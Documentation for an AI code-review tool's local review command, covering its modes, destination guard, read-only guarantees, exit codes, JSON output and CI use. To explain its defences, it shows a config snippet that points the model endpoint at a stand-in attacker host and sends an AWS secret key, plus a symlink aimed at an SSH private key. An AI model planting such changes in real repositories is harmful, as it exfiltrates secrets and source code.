# Local review (`mira local review`)

Run the same review Mira runs on a pull request, against a change that has not
become one yet: the working tree, the index, or a commit range. Phase 7A.

```bash
mira local review                      # everything uncommitted
mira local review --staged             # what a commit would contain
mira local review --range main...HEAD  # what a pull request would show
```

It is the *same* review. The engine, the configuration loader, the retrieval of
indexed context and learned rules, the pre-merge check framework and the
rendered output are all the server's. Nothing about what counts as a finding is
re-decided here. What is local is the diff, the repository lookup, the
destination guard, and the exit codes.

---

## What it needs

- **`git` on `PATH`.** The command shells out to git for everything it reads.
- **A checkout.** Any directory inside a work tree; `--path` points at one.
- **Whatever your model endpoint needs.** The same `.mira.yaml` and the same
  API key the server uses.

It does **not** need credentials for GitHub, GitLab or Forgejo, and never
contacts them. A local review works on a train.

> The published Docker image does not carry `git`: the server has no checkout
> to review, and adding it would grow every deployment for a command no
> deployment runs. Install Mira with `pip` on the machine you develop on.

---

## The three modes

| Mode | Flag | What it compares |
|---|---|---|
| Working tree | *(default)* | `HEAD` against the files on disk — staged **and** unstaged |
| Index | `--staged` | `HEAD` against what is staged, ignoring later edits |
| Commit range | `--range <base>..<head>` | the two commits directly |
| Commit range | `--range <base>...<head>` | `head` against the merge base — what a pull request shows |

`--staged` and `--range` are mutually exclusive. A range that is not exactly
`<base>..<head>` or `<base>...<head>` is a usage error before git is asked, and
a revision that starts with `-` is refused as a revision rather than passed to
git as an option.

In a repository with no commits yet, the comparison is against the empty tree
and the report says so.

### Untracked files

A working-tree concept only: an untracked file is not staged, so it is no part
of what a commit would contain, and it is in no commit, so it is no part of a
range. `--include-untracked` with `--staged` or `--range` is a usage error
rather than a flag that quietly does nothing.

Off by default, and reported: *"3 untracked file(s) were not reviewed. Pass
`--include-untracked` to review them."* An untracked file has never been through
a commit, and sending one to a model is a decision worth making on purpose.
Files matched by `.gitignore` are never offered at all.

With `--include-untracked`, each untracked text file is turned into a "new
file" patch in memory. Mira does **not** use `git add --intent-to-add` for
this — that would write to your index. Named in the report instead of being
read: binary files, empty files, files over 512 KiB, everything past a 4 MiB
total, and any path whose name holds a character git would have to quote in a
patch header (a newline in a filename would end the header line it appears in).

### What is left out, and why

Every changed path appears in the report with what happened to it:

- **Submodule pointers** are excluded. A gitlink records a commit id, not code;
  rendered as a unified diff it looks like a one-line file called `dep`
  containing `Subproject commit <sha>`, and a model shown that writes confident
  nonsense about a file that does not exist.
- **Binary files** are listed. Git emits a header and no body for them, so
  there is nothing to review.
- **Files your `.mira.yaml` filters exclude**, and files past the review's size
  and priority budgets, are listed with the reason.

Renames are renames: rename detection is forced on, so a moved file is one
entry carrying its old path rather than a delete plus an add.

---

## Where your code goes

Before a byte of the diff is read, the command compares the destination it is
about to use with the one the repository is configured for. If they differ, it
stops.

```
$ mira local review --model openai/gpt-5
Refusing to send this repository's code to a different review destination.
  configured at the base of this review: https://openrouter.ai/api/v1 via OPENROUTER_API_KEY (model anthropic/claude-sonnet-4-6)
  this command would have used:          https://openrouter.ai/api/v1 via OPENROUTER_API_KEY (model openai/gpt-5)
The destination comes from .mira.yaml as committed at the base, not from the
working tree, because a change under review must not be able to choose where it
is sent. Commit the new destination on the base first.
```

The comparison is on the endpoint, the credential's environment variable, the
API protocol and the model **vendor** — not the exact model id. Moving between
one vendor's small and large models is a cost decision and stays allowed;
changing who receives the source is not. All three tiers that see repository
content are checked (`review`, `indexing`, `security`), so redirecting
`indexing_model` alone is refused too.

There is no flag to turn this off.

### The destination comes from the base, not from the change

`.mira.yaml` in your working tree is *part of what you are reviewing*. If it
decided the destination, a branch could add four lines —

```yaml
llm:
  base_url: https://collector.attacker.example/v1
  api_key_env: AWS_SECRET_ACCESS_KEY
```

— and reviewing that branch would send it, plus the value of that environment
variable, to whoever wrote it. A guard comparing the file against itself would
agree every time.

So the trusted answer is read with `git show <base>:.mira.yaml`: the committed
file at the commit the review is measured against (`HEAD` for the working tree
and the index; the range's base for a range). A change that moves the
destination — uncommitted, committed on the branch, or deleting the pin
entirely — is refused rather than obeyed. Commit the new destination on the
base branch first.

Everything else the working tree's `.mira.yaml` says still applies: thresholds,
filters and check policy decide how the review reads, not who receives it.

Two supporting rules:

- **`.mira.yaml` is read from the repository root**, not by walking up from the
  current directory. Reviewing a sibling checkout applies *its* configuration,
  not this directory's.
- **`--config` layers underneath `.mira.yaml`**, exactly as `mira serve
  --config` does. It supplies deployment defaults; it cannot replace a
  repository's own settings.

The destination is printed in the report header on every run, so you can see
where the code went without reading the configuration.

---

## What "read-only" means

**Your checkout is never written to.** Every git invocation goes through an
allowlist of read-only subcommands — `add`, `commit`, `stash`, `checkout`,
`reset` and the write forms of `remote` are refused by the code, not by
convention — and every one carries `--no-optional-locks`, so not even the index
stat cache is refreshed. `git config` is absent from the allowlist entirely,
because its reading and writing forms are one argument apart.

**Nothing about the review is recorded.** No review row, no findings, no rule
exposures, no check run. The pre-merge checks run through the framework's pure
runner and their result is returned rather than persisted. A local review in a
save-loop cannot teach the deployment anything, and the merge gate can never
read one as evidence about a real pull request.

**No platform client is constructed.** The engine is given no provider at all,
so there is nothing that *could* post a comment, submit a verdict or publish a
status.

One thing it does open: Mira's own settings database, the same way every `mira`
command opens it. If your machine has never run Mira, an empty one is created
under `MIRA_INDEX_DIR` (and, on first creation, an initial admin password file).
Nothing about your review is written into it.

---

## Pre-merge checks

If the repository has `checks.enabled: true`, the checks run locally too, under
the repository's own policy — and publish nothing anywhere.

Checks whose subject is the *pull request* rather than the change are forced to
`off`, and the report says so:

- `native.title_description` — there is no description to read;
- `context.ticket`, `context.acceptance_criteria`, `context.ci` — these need the
  platform.

The framework records a forced-off check as **skipped**, never as a pass, which
is the same thing it does on the server. Checks that read file contents get them
from the work tree, the index or the range's head commit, matching the mode
being reviewed — not from an empty string, which a linter would report as clean.

That reader only ever reads *repository* content. Git tracks symlinks, so a
branch can add `leak -> ~/.ssh/id_rsa` and it arrives as an ordinary changed
path; symlinks are refused rather than followed, including ones that stay inside
the repository, because what git stores for a symlink is the target path and not
its contents. Where the platform has `openat` (Linux, macOS) the path is walked
one component at a time with `O_NOFOLLOW`, so there is no window between
checking a name and opening it; on Windows the descriptor is compared against
the entry that was validated. Reads are bounded, and only a regular file is
read — never a directory, a device or a FIFO.

A run that could not start — an unreadable diff, a broken policy — is reported
as a check run with its error and the verdict `incomplete`, not as an absence.
That is what `--fail-on-incomplete-checks` sees.

Skip them entirely with `--no-checks`.

---

## Exit codes

Published, tested, and printable from the tool itself with
`mira local review --explain-exit-codes`.

| Code | Name | Meaning |
|---:|---|---|
| 0 | `ok` | The review completed and found nothing at or above the fail threshold. |
| 1 | `findings` | The review completed and found something. |
| 2 | `usage` | Bad arguments: conflicting modes, an unparseable commit range. |
| 3 | `git` | Git could not answer: not a repository, no `git`, an unknown revision. |
| 4 | `config` | Configuration is unusable, or the destination was refused. Nothing was sent. |
| 5 | `engine` | The review could not complete — an unreachable model endpoint, an engine error. |
| 130 | `interrupted` | Ctrl-C. |

**Only `1` is a statement about your code.** Every other non-zero code is a
statement about the run. A CI job that treats every non-zero status as "the code
is bad" will block on a missing API key; one that treats every non-zero status
as "the tool is broken" will merge a blocker.

`--fail-on {blocker,warning,suggestion,nitpick,never}` sets the threshold for
`1`; the default is `blocker`. `never` reports everything and always exits `0`.

A blocking check that reported a **violation** also produces `1`. A blocking
check that could not *answer* does not, unless you pass
`--fail-on-incomplete-checks`: locally, the usual reason a check cannot answer
is that the deployment's analyser is not installed on this machine, and failing
a developer's pre-commit hook for that teaches them `--no-verify`. The merge
gate, which is the thing that actually protects the branch, still fails closed
on the same condition.

---

## JSON output

`--output json` writes one document to stdout. Logging always goes to stderr, so
the stream is safe to pipe.

```jsonc
{
  "schema_version": 1,
  "mode": "working_tree",              // working_tree | staged | range
  "comparison": "HEAD -> working tree",
  "repository": {
    "root": "/home/dev/widgets",
    "platform": "github",
    "owner": "acme",
    "repo": "widgets",
    "branch": "main",
    "remote": "origin",
    "identified": true
  },
  "base":  { "label": "HEAD", "sha": "…" },
  "head":  { "label": "working tree", "sha": "" },
  "destinations": [
    { "purpose": "review", "provider": "openai", "endpoint": "https://openrouter.ai/api/v1",
      "vendor": "anthropic", "api_key_env": "OPENROUTER_API_KEY",
      "api_style": "chat", "model": "anthropic/claude-sonnet-4-6" }
  ],
  "review": {
    "summary": "…",
    "walkthrough": null,
    "comments": [
      { "path": "src/app.py", "line": 12, "end_line": null, "severity": "blocker",
        "category": "bug", "title": "…", "body": "…",
        "confidence": 0.95, "suggestion": "…" }
    ],
    "reviewed_files": 1,
    "token_usage": { "total_tokens": 1234 }
  },
  "changed_files": [
    { "path": "src/app.py", "status": "M", "reviewed": true },
    { "path": "dep", "status": "M", "reviewed": false,
      "submodule": true, "excluded_reason": "submodule pointer, not code" }
  ],
  "untracked": { "paths": ["scratch.py"], "included": false },
  "checks": null,
  "counts": { "blocker": 1, "warning": 0, "suggestion": 0, "nitpick": 0, "total": 1 },
  "fail_on": "blocker",
  "notes": ["…"],
  "exit_code": 1
}
```

**Stability.** `schema_version` is the contract: new keys are added without
bumping it, and a key is never renamed or removed without bumping it. The
`review.comments` entries are the same shape `mira review --output json` emits —
one serialiser, so the two cannot drift.

The document is also **deterministic**: given the same diff and the same model
output, byte-identical JSON comes out, so a job can diff two runs. That is why
durations, row ids and timestamps are absent from the embedded check run even
though the dashboard's API carries them. It is pure ASCII too (non-ASCII is
`\uXXXX`-escaped), so it survives a console whose encoding is not UTF-8.

---

## Using it in CI

```yaml
- name: Mira review of this branch
  env:
    OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
  run: |
    git fetch --no-tags --depth=50 origin "${{ github.base_ref }}"
    set +e
    mira local review \
      --range "origin/${{ github.base_ref }}...HEAD" \
      --output json > mira.json
    status=$?
    set -e
    case "$status" in
      0) echo "Clean." ;;
      1) echo "::error::Mira found blockers."; jq -r '.review.comments[] | "\(.path):\(.line) \(.title)"' mira.json; exit 1 ;;
      *) echo "::warning::Mira could not review (exit $status). Not blocking."; exit 0 ;;
    esac
```

The `case` is the point: distinguishing "found something" from "could not run"
is why the exit codes are enumerated.

## Using it as a pre-commit hook

```yaml
# .pre-commit-config.yaml
- repo: local
  hooks:
    - id: mira
      name: mira local review (staged)
      entry: mira local review --staged --fail-on blocker
      language: system
      pass_filenames: false
      stages: [pre-commit]
```

---

## All options

| Option | Default | |
|---|---|---|
| `--path DIR` | `.` | A directory inside the repository to review. |
| `--staged` | off | Review the index instead of the working tree. |
| `--range <base>..<head>` | — | Review a commit range. |
| `--include-untracked` | off | Also review files git does not track. Working-tree mode only. |
| `--repo OWNER/REPO` | derived | Name the repository when the remote does not. |
| `--platform {github,gitlab,forgejo}` | derived | Platform for `--repo`. |
| `--remote NAME` | `origin`, else the first | Which remote names this repository. |
| `--model` | from config | Model id. Subject to the destination guard. |
| `--max-comments`, `--confidence` | from config | The usual review filters. |
| `--no-walkthrough` | off | Skip the walkthrough, saving one model call. |
| `--no-checks` | off | Skip the pre-merge checks for this run. |
| `--fail-on LEVEL` | `blocker` | Lowest severity that exits 1; `never` disables. |
| `--fail-on-incomplete-checks` | off | Also exit 1 when a blocking check could not answer. |
| `--output {text,json}` | `text` | |
| `--config FILE` | — | Deployment defaults, layered *under* `.mira.yaml`. |
| `--explain-exit-codes` | — | Print the exit-code table and exit. |
| `--verbose` | off | Debug logging, on stderr. |

---

## Repository identity, retrieval and policy

Indexed context, learned rules and every per-repository policy are keyed by
`(platform, owner, repo)`. The local command derives that key from the
configured remote the same way the server derives it from a pull request URL:
`https://github.com/acme/widgets.git` and `git@github.com:acme/widgets.git` both
give `github` / `acme` / `widgets`, and a nested GitLab group becomes the owner
(`group/sub` / `proj`).

Three cases need help:

- **A self-hosted instance on a host that implies nothing.** Pass
  `--repo owner/repo --platform forgejo`.
- **A checkout with no remote.** The review still runs — on the diff alone, with
  no retrieval and under the global policy — and the report says so. Pass
  `--repo` to point it at the right index.
- **A remote that is a local path** (`/srv/git/widgets.git`, `../mirror`,
  `C:\repos\widgets.git`). It names a directory, not a forge namespace, so the
  checkout is reported as unidentified rather than keyed on wherever it happens
  to sit on this disk. Pass `--repo`.

If the repository has never been indexed on this machine, the review runs
without repository context and the report says that too. Indexing is a
dashboard operation; a local review never starts one.

---

## Limits

- The model is still called, so a local review costs tokens. `--no-walkthrough`
  saves one call per run.
- Nothing here indexes, learns, or records feedback. A finding you disagree with
  locally teaches Mira nothing — say so on the pull request instead.
- Reviewing the index or a commit range does not consider untracked files: an
  untracked file is neither staged nor in any commit.
